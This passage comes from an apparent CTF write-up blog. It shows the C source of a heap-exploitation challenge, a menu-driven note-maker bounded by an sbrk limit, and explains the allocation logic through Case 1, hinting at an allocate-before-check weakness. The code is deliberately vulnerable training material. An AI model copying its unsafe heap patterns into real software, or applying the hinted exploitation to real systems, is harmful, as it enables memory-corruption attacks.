</span></span><span class="line"><span class="cl">    <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">free</span><span class="p">(</span><span class="nf">malloc</span><span class="p">(</span><span class="mh">0x418</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="n">limit</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span> <span class="nf">sbrk</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;hi&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Options:&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;1) malloc up to 0x100 bytes&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;2) free chunks and clear ptr&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;3) print chunks using puts&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;4) read to chunks with max possible size&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;&gt; &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">uint</span> <span class="n">option</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">option</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nf">getchar</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">switch</span> <span class="p">(</span><span class="n">option</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">                <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Index: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%ld&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">idx</span><span class="p">)</span> <span class="o">||</span> <span class="n">idx</span> <span class="o">&gt;=</span> <span class="mh">0x10</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;idx &lt; 0x10&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">                <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Size: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%ld&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sz</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="n">sz</span> <span class="o">||</span> <span class="n">sz</span> <span class="o">&gt;</span> <span class="mh">0xf8</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;0 &lt; sz &lt;= 0xf8&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">                <span class="n">chunks</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">sz</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="n">chunks</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">&gt;</span> <span class="n">limit</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;hey where do you think ur going&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="c1">// if (malloc_usable_size(chunks[idx])) free(chunks[idx])
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="n">chunks</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                    <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">                <span class="kt">uint16_t</span> <span class="n">usable_size</span> <span class="o">=</span> <span class="n">sz</span> <span class="o">&gt;</span> <span class="mh">0x18</span> <span class="o">?</span> <span class="p">(</span><span class="n">sz</span><span class="o">+</span><span class="mi">7</span><span class="o">&amp;~</span><span class="mh">0xf</span><span class="p">)</span><span class="o">+</span><span class="mi">8</span> <span class="o">:</span> <span class="mh">0x18</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="n">sizes</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">usable_size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="mi">2</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">                <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Index: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%ld&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">idx</span><span class="p">)</span> <span class="o">||</span> <span class="n">idx</span> <span class="o">&gt;=</span> <span class="mh">0x10</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;idx &lt; 0x10&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="n">chunks</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;no chunk at this idx&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="nf">free</span><span class="p">(</span><span class="n">chunks</span><span class="p">[</span><span class="n">idx</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">                <span class="n">chunks</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="n">sizes</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="mi">3</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">                <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Index: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%ld&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">idx</span><span class="p">)</span> <span class="o">||</span> <span class="n">idx</span> <span class="o">&gt;=</span> <span class="mh">0x10</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;idx &lt; 0x10&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">chunks</span><span class="p">[</span><span class="n">idx</span><span class="p">])</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;no chunk at this idx&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">                <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Data: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="nf">puts</span><span class="p">(</span><span class="n">chunks</span><span class="p">[</span><span class="n">idx</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="mi">4</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">                <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Index: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%ld&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">idx</span><span class="p">)</span> <span class="o">||</span> <span class="n">idx</span> <span class="o">&gt;=</span> <span class="mh">0x10</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;idx &lt; 0x10&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">chunks</span><span class="p">[</span><span class="n">idx</span><span class="p">])</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;no chunk at this idx&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">                <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Data: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="kt">int</span> <span class="n">len</span> <span class="o">=</span> <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">chunks</span><span class="p">[</span><span class="n">idx</span><span class="p">],</span> <span class="p">(</span><span class="n">uint</span><span class="p">)</span> <span class="n">sizes</span><span class="p">[</span><span class="n">idx</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="n">len</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;read failed&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">                <span class="n">chunks</span><span class="p">[</span><span class="n">idx</span><span class="p">][</span><span class="n">len</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">default</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">                <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;invalid option&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p><em>Ah, I get a wave of nostalgia every time I see note-maker-style heap challenges. But hold on—this one&rsquo;s not your typical heap playground. There&rsquo;s a sneaky twist waiting beneath the surface.</em></p></blockquote>
<p>Lets understand the code piece by piece</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;malloc.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">char</span><span class="o">*</span> <span class="n">chunks</span><span class="p">[</span><span class="mh">0x10</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="kt">uint16_t</span> <span class="n">sizes</span><span class="p">[</span><span class="mh">0x10</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">idx</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">sz</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span><span class="o">*</span> <span class="n">limit</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">free</span><span class="p">(</span><span class="nf">malloc</span><span class="p">(</span><span class="mh">0x418</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="n">limit</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span> <span class="nf">sbrk</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;hi&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// While loop code
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>The program begins by defining two global arrays:</p>
<ul>
<li><code>chunks[0x10]</code>: an array of 16 pointers to heap-allocated memory chunks.</li>
<li><code>sizes[0x10]</code>: an array of 16 <code>uint16_t</code> elements storing the size of each corresponding chunk.
Notably, each size entry is a 2-byte value (<code>uint16_t</code>), meaning the program can store chunk sizes up to <code>0xffff</code> (65535 bytes).</li>
</ul>
<p>This kind of setup is typical in heap exploitation challenges, where allocated heap chunks are stored in a global <code>chunks</code> array, and their corresponding sizes are tracked in a separate <code>sizes</code> array.</p>
<h3 class="heading-element" id="now-in--main-function"><span>Now, In  main Function</span>
  <a href="#now-in--main-function" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>Two local variables are declared: <code>idx</code> and <code>sz</code>.</p>
<ul>
<li><code>idx</code> will likely be used as an index into the <code>chunks</code> and <code>sizes</code> arrays.</li>
<li><code>sz</code> presumably stores the size for a new allocation.</li>
</ul>
<p>The <code>setvbuf</code> calls disable I/O buffering to ensure immediate input/output, it’s a common practice in CTF challenges.</p>
<p>Then, the program performs a <code>malloc(0x418)</code> and immediately frees the resulting chunk.</p>
<p>Next, the program sets the <code>limit</code> pointer using <code>sbrk(0)</code>. This syscall returns the current program break — i.e., the end of the heap segment.</p>
<aside>
💡
<p>The <code>sbrk(0)</code> syscall returns the current <strong>program break</strong>, which is the end of the process’s <strong>heap segment</strong>. ( here it will return the heap address immediately at the end of the freed chunk )</p>
</aside>
<p>I wonder how it may be used in further code , but i am not getting good vibes for this limit stuff.</p>
<img src="http://localhost:1313/d1ff/images_limit/9yg62s.jpg" width="400" style="display: block; margin: auto;"  />
<!-- ![9yg62s.jpg](/d1ff/images_limit/9yg62s.jpg) -->
<h3 class="heading-element" id="case-1-malloc-up-to-0x100-bytes"><span>Case 1: Malloc up to 0x100 bytes</span>
  <a href="#case-1-malloc-up-to-0x100-bytes" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Options:&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;1) malloc up to 0x100 bytes&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;2) free chunks and clear ptr&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;3) print chunks using puts&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;4) read to chunks with max possible size&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;&gt; &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">uint</span> <span class="n">option</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">option</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nf">getchar</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">switch</span> <span class="p">(</span><span class="n">option</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">                <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Index: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%ld&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">idx</span><span class="p">)</span> <span class="o">||</span> <span class="n">idx</span> <span class="o">&gt;=</span> <span class="mh">0x10</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;idx &lt; 0x10&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">                <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Size: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%ld&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sz</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="n">sz</span> <span class="o">||</span> <span class="n">sz</span> <span class="o">&gt;</span> <span class="mh">0xf8</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;0 &lt; sz &lt;= 0xf8&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">                <span class="n">chunks</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">sz</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="n">chunks</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">&gt;</span> <span class="n">limit</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;hey where do you think ur going&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="n">chunks</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                    <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">                <span class="kt">uint16_t</span> <span class="n">usable_size</span> <span class="o">=</span> <span class="n">sz</span> <span class="o">&gt;</span> <span class="mh">0x18</span> <span class="o">?</span> <span class="p">(</span><span class="n">sz</span><span class="o">+</span><span class="mi">7</span><span class="o">&amp;~</span><span class="mh">0xf</span><span class="p">)</span><span class="o">+</span><span class="mi">8</span> <span class="o">:</span> <span class="mh">0x18</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="n">sizes</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">usable_size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="c1">//further cases
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">//The initial four lines simply print out the menu with the available options.          
</span></span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p>First, it checks whether the index where you want to store your chunk&rsquo;s address lies within the bounds of the <code>chunks</code> table.</p></blockquote>
<blockquote>
<p>If that passes, it then checks the size — it must be positive and less than or equal to <code>0xf8</code>.</p></blockquote>
<blockquote>
<p>Now here comes the twist: it <strong>allocates</strong> the chunk <strong>before</strong> checking if the allocated pointer lies beyond a certain <code>limit</code>. If the pointer <em>is</em> beyond <code>limit</code>, it immediately nulls out the chunk at that index in the <code>chunks</code> table.</p></blockquote>
<p>🥲 <em>This is kind of a disaster for us, because you’re basically forced to stay within a specific memory region — you can’t go wild across other memory regions after this limit.</em></p>
<aside>
💡
<p>But,  there’s something suspicious here.</p>
<p>The <strong>order</strong> of operations is the key — the program allocates memory <em>first</em>, then checks if it’s valid. This might seem trivial, but it&rsquo;s exactly the kind of detail that can turn out to be gold for exploitation later.</p>
</aside>
<hr>
<h3 class="heading-element" id="case-2-free-chunks-and-clear-ptr"><span>Case 2: Free chunks and clear ptr</span>
  <a href="#case-2-free-chunks-and-clear-ptr" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
